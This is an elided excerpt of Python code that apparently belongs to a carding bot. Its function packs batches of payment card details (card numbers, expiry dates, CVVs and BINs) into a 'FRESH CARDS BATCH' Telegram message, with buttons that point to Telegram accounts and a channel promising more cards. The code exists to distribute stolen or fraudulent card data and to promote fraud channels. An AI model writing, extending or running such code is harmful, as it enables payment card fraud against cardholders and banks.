...
def send_batch_to_telegram(cards_batch, bot_token, chat_id):
    """Send multiple cards in one message"""
    if not cards_batch:
        return
    
    # Join multiple cards in one message
    combined_message = "🚀 <b>FRESH CARDS BATCH</b> 🚀\n"
    combined_message += "━━━━━━━━━━━━━━━━━━\n\n"
    
    for card_details, card_type, card_number in cards_batch:
        BIN = card_number[:6]
        month, year, cvv = card_details.split('|')[1], card_details.split('|')[2], card_details.split('|')[3]
    ...
    reply_markup = {
        "inline_keyboard": [[
            {"text": "🔥 GET MORE", "url": "https://t.me/Atul_FROXT_73"},
            {"text": "📢 CHANNEL", "url": "https://t.me/+gS3I7lo7i98zZjc1"}
        ]]
    }
